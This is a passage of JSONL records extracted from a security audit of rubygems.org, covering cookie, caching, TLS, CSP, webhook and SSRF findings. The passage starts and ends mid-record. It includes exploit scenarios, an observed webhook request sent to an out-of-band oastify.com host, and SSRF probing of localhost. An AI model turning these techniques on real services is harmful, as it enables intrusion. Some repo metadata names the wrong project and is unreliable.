defense-in-depth improvement; this finding's severity is therefore low.\n", "full_markdown": "# 2. Rails cookies lack SameSite protections\n\n| Severity: Low                                                                                      | Diffi culty: High     |\n|-------------------------------------------------------------------------------------------------------|-----------------------------|\n| Type: Configuration                                                                                | Finding ID: TOB-RGM-2 |\n| Target: rubygems.org/lib/github_oauthable.rb, rubygems.org/config/initializers/session_store.rb |                             |\n\n## Description\n\nAs [stated](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value) in MDN, the SameSite cookie attribute provides the following functionality:\n\nControls whether or not a cookie is sent with cross-site requests, providing some protection against cross-site request forgery attacks (CSRF).\n\nRubyGems disables strict SameSite protections in a number of locations by setting the attributes value to Lax. For example, the following location sets this value explicitly:\n\n```\ndef log_in_as(user:, expires: 1.hour)\n  cookies.encrypted[admin_cookie_name] = {\n    value: user.id,\n    expires: expires,\n    same_site: :lax\n  }\nend\n```\n\n*Figure 2.1: Admin cookie setting SameSite=Lax ([rubygems.org/lib/github\\\\_oauthable.rb#72–78](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/lib/github_oauthable.rb#L72-L78))*\n\nThis value is also implicitly set on the Rails session cookie in the following location:\n\n```\nRails.application.config.session_store :cookie_store, key: '_rubygems_session'\n               Figure 2.2: Session cookie implicitly setting SameSite=Lax\n           (rubygems.org/config/initializers/session_store.rb#8)\n```\n\nBy default, when using cookie\\_store, the session cookie will set [SameSite](https://guides.rubyonrails.org/configuring.html#config-action-dispatch-cookies-same-site-protection)=Lax. This is better than setting the value to None, but it still ultimately introduces the risk of CSRF attacks. Because Rails provides built-in CSRF protections, this is a defense-in-depth improvement; this finding's severity is therefore low.\n\n#### Exploit Scenario\n\nAn attacker discovers a GET-based CSRF vulnerability in the RubyGems application. They then discover a bypass for built-in protections, or discover a controller that has set\n\n\n\n[skip\\\\_forgery\\\\_protection](https://api.rubyonrails.org/classes/ActionController/RequestForgeryProtection/ClassMethods.html#method-i-skip_forgery_protection). They are then able to carry out the CSRF attack due to a lack of SameSite protections on RubyGems cookies.\n\n#### Recommendations\n\nShort term, configure SameSite=Strict on all application cookies.\n\nLong term, incorporate the rails-cookie-attributes Semgrep rule from [appendix](#page-89-0) E.2 into your CI systems.\n", "severity": "Low", "difficulty": "High", "type": "Configuration", "finding_id": "TOB-RGM-2", "target": {"path": "rubygems.org/lib/github_oauthable.rb, rubygems.org/config/initializers/session_store.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems.org", "org": "rubygems", "name": "rubygems.org", "commit": "21895a522076d15a3cb8d072229e2cfdbdb873e8", "branch": null, "relative_file": "rubygems.org/lib/github_oauthable.rb, rubygems.org/config/initializers/session_store.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Type": "Configuration", "Finding ID": "TOB-RGM-2", "Target": "rubygems.org/lib/github_oauthable.rb, rubygems.org/config/initializers/session_store.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-003", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 3, "page_start": 24, "title": "Memcached cache store may allow Marshal deserialization", "short_summary": null, "description_md": "#### Description\n\nDeserialization of attacker-controlled [Marshal](https://ruby-doc.org/3.3.4/Marshal.html#module-Marshal-label-Security+considerations) data may result in remote code execution. The RubyGems application uses Memcached as its cache store in the following location:\n\n```\nconfig.cache_store = :mem_cache_store, ENV['MEMCACHED_ENDPOINT'], {\n  failover: true,\n  socket_timeout: 1.5,\n  socket_failure_delay: 0.2,\n  compress: true,\n  compression_min_size: 524_288,\n  value_max_bytes: 2_097_152 # 2MB\n}\n```\n\n*Figure 3.1: Rails Memcached cache store ([rubygems.org/config/environments/production.rb#116–123](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/config/environments/production.rb#L116-L123))*\n\nThe :mem\\_cache\\_store symbol maps to the [MemCacheStore](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveSupport/Cache/MemCacheStore.html), which subclasses [ActiveSupport::Cache::Store](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveSupport/Cache/Store.html). This parent class allows a [serializer](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveSupport/Cache/Store.html#method-c-new) to be configured. The default serializer for Rails 7.1 is [:marshal\\\\_7\\\\_1](https://github.com/rails/rails/blob/v7.1.4/activesupport/lib/active_support/cache.rb#L775). The serializer can be configured as [:message\\\\_pack](https://github.com/rails/rails/blob/v7.1.4/activesupport/lib/active_support/cache/serializer_with_fallback.rb#L166-L172), which will default to a more secure serialization format; however, it will [fallback](https://github.com/rails/rails/blob/v7.1.4/activesupport/lib/active_support/cache/serializer_with_fallback.rb#L141) to the insecure Marshal format if it receives Marshal data. A custom serializer is needed to completely mitigate this attack vector.\n", "full_markdown": "# 3. Memcached cache store may allow Marshal deserialization\n\n| Severity: Informational                                | Diffi culty: High     |\n|-----------------------------------------------------------|-----------------------------|\n| Type: Data Validation                               | Finding ID: TOB-RGM-3 |\n| Target: rubygems.org/config/environments/production.rb |                             |\n\n#### Description\n\nDeserialization of attacker-controlled [Marshal](https://ruby-doc.org/3.3.4/Marshal.html#module-Marshal-label-Security+considerations) data may result in remote code execution. The RubyGems application uses Memcached as its cache store in the following location:\n\n```\nconfig.cache_store = :mem_cache_store, ENV['MEMCACHED_ENDPOINT'], {\n  failover: true,\n  socket_timeout: 1.5,\n  socket_failure_delay: 0.2,\n  compress: true,\n  compression_min_size: 524_288,\n  value_max_bytes: 2_097_152 # 2MB\n}\n```\n\n*Figure 3.1: Rails Memcached cache store ([rubygems.org/config/environments/production.rb#116–123](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/config/environments/production.rb#L116-L123))*\n\nThe :mem\\_cache\\_store symbol maps to the [MemCacheStore](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveSupport/Cache/MemCacheStore.html), which subclasses [ActiveSupport::Cache::Store](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveSupport/Cache/Store.html). This parent class allows a [serializer](https://api.rubyonrails.org/v7.1.3.4/classes/ActiveSupport/Cache/Store.html#method-c-new) to be configured. The default serializer for Rails 7.1 is [:marshal\\\\_7\\\\_1](https://github.com/rails/rails/blob/v7.1.4/activesupport/lib/active_support/cache.rb#L775). The serializer can be configured as [:message\\\\_pack](https://github.com/rails/rails/blob/v7.1.4/activesupport/lib/active_support/cache/serializer_with_fallback.rb#L166-L172), which will default to a more secure serialization format; however, it will [fallback](https://github.com/rails/rails/blob/v7.1.4/activesupport/lib/active_support/cache/serializer_with_fallback.rb#L141) to the insecure Marshal format if it receives Marshal data. A custom serializer is needed to completely mitigate this attack vector.\n\n#### Exploit Scenario\n\nAn attacker gains unauthorized access to the Memcached instance(s) used by the RubyGems application. This could occur due a separate vulnerability such as server-side request forgery (SSRF), or improper access controls configured on the Memcached instance(s). The attacker could then add malicious, serialized Marshal objects to the instance(s) that are later deserialized by the application, resulting in code execution.\n\nAt this time, we are unaware of any entrypoints to add malicious Marshal objects to production Memcached instance(s), so we have marked this finding as informational. However, similar attack chains have been observed. For example, GitHub Enterprise saw a similar vulnerability chain presented in A New Era of SSRF, included in the References section below.\n\n\n#### Recommendations\n\nShort term, create a custom JSON or MessagePack serializer that does not fallback on deserializing Marshal data. ActiveSupport::Cache::Store supports specifying a custom [serializer](https://github.com/rails/rails/blob/v7.1.4/activesupport/lib/active_support/cache.rb#L327-L328) module. Something similar to [MessagePackWithFallback](https://github.com/rails/rails/blob/v7.1.4/activesupport/lib/active_support/cache/serializer_with_fallback.rb#L140-L164) can be used, except without the fallback.\n\nLong term, incorporate the rails-cache-store-marshal Semgrep rule from [appendix](#page-89-0) [E.2](#page-89-0) into your CI systems.\n\n#### References\n\n● A New Era of SSRF - Exploiting URL Parser in Trending [Programming](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) Languages!\n", "severity": "Informational", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-RGM-3", "target": {"path": "rubygems.org/config/environments/production.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems.org", "org": "rubygems", "name": "rubygems.org", "commit": "21895a522076d15a3cb8d072229e2cfdbdb873e8", "branch": null, "relative_file": "rubygems.org/config/environments/production.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-RGM-3", "Target": "rubygems.org/config/environments/production.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-004", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 4, "page_start": 26, "title": "HSTS includeSubDomains disabled in production environment", "short_summary": null, "description_md": "#### Description\n\nThe HTTP [Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security) (HSTS) response header ensures that subsequent connections to a site are encrypted. Additionally, the [includeSubDomains](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security#includesubdomains) directive applies the same configuration to all of a domain's subdomains. The production environment disables this functionality in the following location:\n\n```\n# Force all access to the app over SSL, use Strict-Transport-Security, and use\nsecure cookies.\nconfig.force_ssl = true\nconfig.ssl_options = {\n  hsts: { expires: 365.days, subdomains: false },\n  redirect: {\n    exclude: ->(request) { request.path.start_with?('/internal') }\n  }\n}\n```\n\n*Figure 4.1: HSTS includeSubDomains disabled ([rubygems.org/config/environments/production.rb#53–60](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/config/environments/production.rb#L53-L60))*\n\nNote that the staging environment repeats this configuration.\n", "full_markdown": "## 4. HSTS includeSubDomains disabled in production environment\n\n| Severity: Low                                          | Diffi culty: High     |\n|-----------------------------------------------------------|-----------------------------|\n| Type: Cryptography                                     | Finding ID: TOB-RGM-4 |\n| Target: rubygems.org/config/environments/production.rb |                             |\n\n#### Description\n\nThe HTTP [Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security) (HSTS) response header ensures that subsequent connections to a site are encrypted. Additionally, the [includeSubDomains](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security#includesubdomains) directive applies the same configuration to all of a domain's subdomains. The production environment disables this functionality in the following location:\n\n```\n# Force all access to the app over SSL, use Strict-Transport-Security, and use\nsecure cookies.\nconfig.force_ssl = true\nconfig.ssl_options = {\n  hsts: { expires: 365.days, subdomains: false },\n  redirect: {\n    exclude: ->(request) { request.path.start_with?('/internal') }\n  }\n}\n```\n\n*Figure 4.1: HSTS includeSubDomains disabled ([rubygems.org/config/environments/production.rb#53–60](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/config/environments/production.rb#L53-L60))*\n\nNote that the staging environment repeats this configuration.\n\n#### Exploit Scenario\n\nAn attacker can perform a downgrade attack against a target connecting to a subdomain of RubyGems.org. They may also passively intercept subsequent HTTP connections after an initial HTTPS connection to subdomains of RubyGems.org.\n\n#### Recommendations\n\nShort term, enable the includeSubDomains directive for HSTS response headers.\n\nLong term, incorporate the action-dispatch-insecure-ssl Semgrep rule from [appendix](#page-89-0) E.2 into your CI systems.\n", "severity": "Low", "difficulty": "High", "type": "Cryptography", "finding_id": "TOB-RGM-4", "target": {"path": "rubygems.org/config/environments/production.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems.org", "org": "rubygems", "name": "rubygems.org", "commit": "21895a522076d15a3cb8d072229e2cfdbdb873e8", "branch": null, "relative_file": "rubygems.org/config/environments/production.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Type": "Cryptography", "Finding ID": "TOB-RGM-4", "Target": "rubygems.org/config/environments/production.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-005", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 5, "page_start": 27, "title": "SMTP mailer may fallback on unencrypted communication", "short_summary": null, "description_md": "#### Description\n\nRails uses ActionMailer to dynamically send emails. It uses the smtp\\_settings option to configure its SMTP deliveries. The RubyGems application configures these settings in the following location:\n\n```\nunless Rails.env.local?\n ActionMailer::Base.smtp_settings = {\n   address: 'smtp.sendgrid.net',\n   port: 587,\n   user_name: ENV['SENDGRID_USERNAME'],\n   password: ENV['SENDGRID_PASSWORD'],\n   domain: 'mailer.rubygems.org',\n   authentication: :plain,\n   enable_starttls_auto: true\n }\n ActionMailer::Base.delivery_method = :smtp\nend\n```\n\n*Figure 5.1: Rails SMTP configuration ([rubygems.org/config/initializers/sendgrid.rb#1–13](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/config/initializers/sendgrid.rb))*\n\nThe StartTLS protocol command is used to establish encrypted communication with the SMTP server. The enable\\_starttls\\_auto setting attempts to establish an encrypted channel, but falls back on unencrypted communication if it fails. However, the [enable\\\\_starttls](https://guides.rubyonrails.org/action_mailer_basics.html#action-mailer-configuration) setting requires a successful StartTLS and fails if it is unsupported.\n", "full_markdown": "# 5. SMTP mailer may fallback on unencrypted communication\n\n| Severity: High                                       | Diffi culty: High     |\n|---------------------------------------------------------|-----------------------------|\n| Type: Cryptography                                   | Finding ID: TOB-RGM-5 |\n| Target: rubygems.org/config/initializers/sendgrid.rb |                             |\n\n#### Description\n\nRails uses ActionMailer to dynamically send emails. It uses the smtp\\_settings option to configure its SMTP deliveries. The RubyGems application configures these settings in the following location:\n\n```\nunless Rails.env.local?\n ActionMailer::Base.smtp_settings = {\n   address: 'smtp.sendgrid.net',\n   port: 587,\n   user_name: ENV['SENDGRID_USERNAME'],\n   password: ENV['SENDGRID_PASSWORD'],\n   domain: 'mailer.rubygems.org',\n   authentication: :plain,\n   enable_starttls_auto: true\n }\n ActionMailer::Base.delivery_method = :smtp\nend\n```\n\n*Figure 5.1: Rails SMTP configuration ([rubygems.org/config/initializers/sendgrid.rb#1–13](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/config/initializers/sendgrid.rb))*\n\nThe StartTLS protocol command is used to establish encrypted communication with the SMTP server. The enable\\_starttls\\_auto setting attempts to establish an encrypted channel, but falls back on unencrypted communication if it fails. However, the [enable\\\\_starttls](https://guides.rubyonrails.org/action_mailer_basics.html#action-mailer-configuration) setting requires a successful StartTLS and fails if it is unsupported.\n\n#### Exploit Scenario\n\nAn attacker is in a privileged network position between the RubyGems application server and the remote SMTP server. When the application server attempts to connect to the SMTP server, the attacker removes StartTLS commands during the initial handshake. They then return an unsupported error to the application server to downgrade the connection to an unencrypted stream.\n\n#### Recommendations\n\nShort term, change the enable\\_starttls\\_auto setting to enable\\_starttls.\n\n\n\nLong term, incorporate the action-mailer-insecure-tls Semgrep rule from [appendix](#page-89-0) [E.2](#page-89-0) into your CI systems.\n", "severity": "High", "difficulty": "High", "type": "Cryptography", "finding_id": "TOB-RGM-5", "target": {"path": "rubygems.org/config/initializers/sendgrid.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rails/rails", "org": "rails", "name": "rails", "commit": null, "branch": null, "relative_file": "rubygems.org/config/initializers/sendgrid.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "High", "Type": "Cryptography", "Finding ID": "TOB-RGM-5", "Target": "rubygems.org/config/initializers/sendgrid.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-006", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 6, "page_start": 29, "title": "Avo controller sets Content-Security-Policy unsafe\\_inline", "short_summary": null, "description_md": "#### Description\n\nThe Content-Security-Policy HTTP header allows web servers to specify content that the web page will load. It is often used to protect against attacks like XSS and clickjacking. The RubyGems application configures the Avo controller's style-src to include unsafe\\_inline:\n\n```\nAvo::ApplicationController.content_security_policy do |policy|\n  policy.style_src :self, \"https://fonts.googleapis.com\", :unsafe_inline\nend\n```\n\n*Figure 6.1: Avo controller configures style-src with :unsafe\\_inline ([rubygems.org/config/initializers/avo.rb#141–143](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/config/initializers/avo.rb#L141-L143))*\n\nThis allows including arbitrary inline style elements or attributes on elements (e.g., in combination with HTML injection). We are unaware of any vulnerabilities that are associated or could be chained with this functionality. However, privacy concerns or unknown attack vectors may still exist, as style elements may import additional stylesheets.\n", "full_markdown": "# 6. Avo controller sets Content-Security-Policy unsafe\\_inline\n\n| Severity: Informational                         | Diffi culty: High     |\n|----------------------------------------------------|-----------------------------|\n| Type: Configuration                             | Finding ID: TOB-RGM-6 |\n| Target: rubygems.org/config/initializers/avo.rb |                             |\n\n#### Description\n\nThe Content-Security-Policy HTTP header allows web servers to specify content that the web page will load. It is often used to protect against attacks like XSS and clickjacking. The RubyGems application configures the Avo controller's style-src to include unsafe\\_inline:\n\n```\nAvo::ApplicationController.content_security_policy do |policy|\n  policy.style_src :self, \"https://fonts.googleapis.com\", :unsafe_inline\nend\n```\n\n*Figure 6.1: Avo controller configures style-src with :unsafe\\_inline ([rubygems.org/config/initializers/avo.rb#141–143](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/config/initializers/avo.rb#L141-L143))*\n\nThis allows including arbitrary inline style elements or attributes on elements (e.g., in combination with HTML injection). We are unaware of any vulnerabilities that are associated or could be chained with this functionality. However, privacy concerns or unknown attack vectors may still exist, as style elements may import additional stylesheets.\n\n#### Recommendations\n\nShort term, remove the :unsafe\\_inline directive.\n\nLong term, if the above recommendation is not feasible, consider using style-src nonces (included in the References section below). These nonces allow a web page to verify the integrity of the stylesheet data it is receiving.\n\n#### References\n\n- CSP style-src [unsafe inline styles](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src#unsafe_inline_styles)\n- CSS [Injection](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) Attacks\n- [Exfiltration](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d) via CSS Injection\n- Better [Exfiltration](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b) via HTML Injection\n", "severity": "Informational", "difficulty": "High", "type": "Configuration", "finding_id": "TOB-RGM-6", "target": {"path": "rubygems.org/config/initializers/avo.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rails/rails", "org": "rails", "name": "rails", "commit": null, "branch": null, "relative_file": "rubygems.org/config/initializers/avo.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Configuration", "Finding ID": "TOB-RGM-6", "Target": "rubygems.org/config/initializers/avo.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-007", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 7, "page_start": 30, "title": "Any user can fire webhooks for the gemcutter gem", "short_summary": null, "description_md": "#### Description\n\nThe RubyGems service offers web hook functionality for a user's gems. The documentation for this functionality is limited, and appears to be available only in the API [documentation](https://guides.rubygems.org/rubygems-org-api/#webhook-methods). Web hooks have a \"fire\" API endpoint that allows a user to test their web hook:\n\n```\ndef fire\n  webhook = @api_key.user.web_hooks.new(url: @url)\n  @rubygem ||= Rubygem.find_by_name(\"gemcutter\")\n  authorize webhook\n  if webhook.fire(request.protocol.delete(\"://\"), request.host_with_port,\n                  @rubygem.most_recent_version, delayed: false)\n    render plain: webhook.deployed_message(@rubygem)\n  else\n    render_bad_request webhook.failed_message(@rubygem)\n  end\nend\n```\n\n*Figure 7.1: Web hook test fire functionality ([rubygems.org/app/controllers/api/v1/web\\\\_hooks\\\\_controller.rb#32–44](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/web_hooks_controller.rb#L32-L44))*\n\nIf the string \"\\*\" is provided as the gem name, then the application will fire a web hook for the gemcutter gem. Any user can initiate this API call and send the result to a URL of their choosing. We observed the following request sent to a URL of our choosing:\n\n```\nPOST / HTTP/1.1\nUser-Agent: Faraday v2.10.1\nAuthorization: <REDACTED>\nHr_target_url: https://rhcixkbny57mb6prujw4r20nve15pvdk.oastify.com\nHr_max_attempts: 3\nContent-Type: application/json\n...\nHost: rhcixkbny57mb6prujw4r20nve15pvdk.oastify.com\nContent-Length: 1560\n{\"name\":\"gemcutter\",\"downloads\":1546928,\"version\":\"0.7.1\", ...}\n```\n\n*Figure 7.2: Web hook request for gemcutter gem*\n\n\nNote that this finding was originally marked as low severity, but has been changed to informational in the final comprehensive report. Any RubyGems user can configure web hooks for any gem, so an attacker firing web hooks for the gemcutter gem is not an additional privilege.\n", "full_markdown": "## 7. Any user can fire webhooks for the gemcutter gem\n\n| Severity: Informational                                | Diffi culty: Low      |\n|-----------------------------------------------------------|-----------------------------|\n| Type: Access Controls                               | Finding ID: TOB-RGM-7 |\n| Target: app/controllers/api/v1/web_hooks_controller.rb |                             |\n\n#### Description\n\nThe RubyGems service offers web hook functionality for a user's gems. The documentation for this functionality is limited, and appears to be available only in the API [documentation](https://guides.rubygems.org/rubygems-org-api/#webhook-methods). Web hooks have a \"fire\" API endpoint that allows a user to test their web hook:\n\n```\ndef fire\n  webhook = @api_key.user.web_hooks.new(url: @url)\n  @rubygem ||= Rubygem.find_by_name(\"gemcutter\")\n  authorize webhook\n  if webhook.fire(request.protocol.delete(\"://\"), request.host_with_port,\n                  @rubygem.most_recent_version, delayed: false)\n    render plain: webhook.deployed_message(@rubygem)\n  else\n    render_bad_request webhook.failed_message(@rubygem)\n  end\nend\n```\n\n*Figure 7.1: Web hook test fire functionality ([rubygems.org/app/controllers/api/v1/web\\\\_hooks\\\\_controller.rb#32–44](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/controllers/api/v1/web_hooks_controller.rb#L32-L44))*\n\nIf the string \"\\*\" is provided as the gem name, then the application will fire a web hook for the gemcutter gem. Any user can initiate this API call and send the result to a URL of their choosing. We observed the following request sent to a URL of our choosing:\n\n```\nPOST / HTTP/1.1\nUser-Agent: Faraday v2.10.1\nAuthorization: <REDACTED>\nHr_target_url: https://rhcixkbny57mb6prujw4r20nve15pvdk.oastify.com\nHr_max_attempts: 3\nContent-Type: application/json\n...\nHost: rhcixkbny57mb6prujw4r20nve15pvdk.oastify.com\nContent-Length: 1560\n{\"name\":\"gemcutter\",\"downloads\":1546928,\"version\":\"0.7.1\", ...}\n```\n\n*Figure 7.2: Web hook request for gemcutter gem*\n\n\nNote that this finding was originally marked as low severity, but has been changed to informational in the final comprehensive report. Any RubyGems user can configure web hooks for any gem, so an attacker firing web hooks for the gemcutter gem is not an additional privilege.\n\n#### Recommendations\n\nShort term, remove the gemcutter web hook fire fallback.\n\nLong term, considering documenting the web hook functionality or removing it if it is no longer needed.\n", "severity": "Informational", "difficulty": "Low", "type": "Access Controls", "finding_id": "TOB-RGM-7", "target": {"path": "app/controllers/api/v1/web_hooks_controller.rb", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/stripe/smokescreen", "org": "stripe", "name": "smokescreen", "commit": null, "branch": null, "relative_file": "app/controllers/api/v1/web_hooks_controller.rb", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Access Controls", "Finding ID": "TOB-RGM-7", "Target": "app/controllers/api/v1/web_hooks_controller.rb"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-008", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 8, "page_start": 32, "title": "SSRF to internal URLs in web hook functionality", "short_summary": null, "description_md": "#### Description\n\nWeb hook test \"fire\" functionality allows specifying sensitive hostnames like localhost and IPs like 10.0.0.1. This allows an attacker to perform SSRF attacks against internal hosts. This functionality exists as an Active Job in the following locations:\n\n```\ndef fire(protocol, host_with_port, version, delayed: true)\n  job = NotifyWebHookJob.new(webhook: self, protocol:, host_with_port:, version:)\n  if delayed\n    job.enqueue\n  else\n    job.perform_now\n  end\nend\n```\n\n*Figure 8.1: Active Record model for firing web hooks ([rubygems.org/app/models/web\\\\_hook.rb#23–31](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/models/web_hook.rb#L23-L31))*\n\nThis functionality ultimately makes an HTTP POST request to an attacker-specified URL in the following location:\n\n```\ndef payload\n  rubygem.payload(version, protocol, host_with_port).to_json\nend\n...\ndef post(url)\n  Faraday.new(nil, request: { timeout: TIMEOUT_SEC }) do |f|\n    f.request :json\n    f.response :logger, logger, headers: false, errors: true\n    f.response :raise_error\n  end.post(\n    url, payload,\n    {\n      \"Authorization\" => authorization,\n      \"HR_TARGET_URL\" => webhook.url,\n      \"HR_MAX_ATTEMPTS\" => \"3\"\n    }\n```\n\n\n) end\n\n> *Figure 8.2: HTTP POST request to URL ([rubygems.org/app/jobs/notify\\\\_web\\\\_hook\\\\_job.rb#77–90](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/app/jobs/notify_web_hook_job.rb#L77-L90))*\n\nTests to most internal URLs seemingly fail, which is not observable to the outside user. However, firing a web hook to http://localhost:3000/api/v1/gems appears to succeed, which indicates that SSRF attacks to internal hosts are possible.\n", "full_markdown": "## 8. SSRF to internal URLs in web hook functionality\n\n| 